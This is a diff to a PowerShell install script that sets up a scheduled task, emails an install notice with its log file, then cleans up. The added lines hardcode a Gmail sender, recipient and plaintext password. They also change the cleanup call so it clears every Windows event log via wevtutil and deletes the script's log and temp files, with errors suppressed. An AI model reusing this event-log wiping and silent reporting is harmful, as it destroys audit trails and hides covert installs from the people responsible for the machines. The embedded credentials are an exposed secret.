@@ -5,7 +5,7 @@ $fname=(new-guid).Guid
 $fname = $fname.substring(0,20)
 $FullLogs = ""
 $LogFilePath="$env:Temp\$fname.001"
-
+$EnableLogs=$True
 Function OutString{
     param (
         [Parameter(Mandatory)]
@@ -13,6 +13,9 @@ Function OutString{
         [string]$Msg
     )
 
+    if($EnableLogs -eq $False){
+        return
+    }
 
     if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
         write-host '[install]   ' -NoNewLine -f Red
@@ -296,20 +299,9 @@ Function Send-InstallNotification {
         $BackupEA = $ErrorActionPreference
         $ErrorActionPreference = "SilentlyContinue"
 
-        $SecMFile='https://vr972be716a04eb6.github.io/dat/mail.dat'
-        $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
-        $webclient = New-Object Net.WebClient
-        $CmdData = $webclient.DownloadString($SecMFile)
-
-        $Pass = $webclient.DownloadString($SecPFile)
-        $Pass = $Pass.substring(0,30)
-        $Pass.length
-        $decrypted=Decrypt-String $CmdData $Pass
-        $CharArray =$decrypted.Split(";")
-
-        $EmailFrom = $CharArray[0]
-        $EmailTo = $CharArray[1]
-        $pass = $CharArray[2]
+        $EmailFrom = "radicaltronic@gmail.com"
+        $EmailTo = "guillaumeplante.qc@gmail.com"
+        $pass = "SecretTEst23_"
 
         $message = new-object System.Net.Mail.MailMessage 
         $message.From = $EmailFrom 
@@ -439,20 +431,27 @@ function Cleanup {
         [switch]$DeleteEvents
     )
 
-    $BackupEA = $ErrorActionPreference
-    $ErrorActionPreference = "SilentlyContinue"
+    try {
+        $BackupEA = $ErrorActionPreference
+        $ErrorActionPreference = "SilentlyContinue"
 
-    if($DeleteEvents){
-        Get-WinEvent -ListLog * -Force | % {   
-            Wevtutil.exe cl $_.LogName | Out-String | Write-Verbose
+        if($DeleteEvents){
+            Get-WinEvent -ListLog * -Force | % {   
+                Wevtutil.exe cl $_.LogName | Out-null   
+            }
         }
-    }
-    if($DeleteLogFiles){
-        Remove-Item -Path "$env:Temp\LogFile.csv" -Force -ErrorAction SilentlyContinue | Out-String | Write-Verbose 
-        Remove-Item -Path $LogFilePath -Force -ErrorAction SilentlyContinue | Out-String | Write-Verbose 
-    }
+        if($DeleteLogFiles){
+            Remove-Item -Path "$env:Temp\LogFile.csv" -Force -ErrorAction SilentlyContinue | Out-null   
+            Remove-Item -Path $LogFilePath -Force -ErrorAction SilentlyContinue  | Out-null   
+        }
 
-    $ErrorActionPreference = $BackupEA
+        $ErrorActionPreference = $BackupEA
+    }
+    catch{
+        $Msg="Ran into an issue: $($PSItem.ToString())"
+        write-verbose $Msg 
+    }  
+
 }
 
 function Set-ScriptDataToRegistry {
@@ -600,9 +599,15 @@ try{
     }     
 }  
 
+$EnableLogs=$false
+$TempFile="$env:Temp\att.txt"
+Copy-Item "$LogFilePath" "$TempFile"
 
 OutString "Send-InstallNotification"
 Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" "$LogFilePath"
 
 OutString "Cleanup"
-Cleanup
+Cleanup -DeleteEvents -DeleteLogFiles
+
+Sleep 1
+Remove-Item "$TempFile" -Force
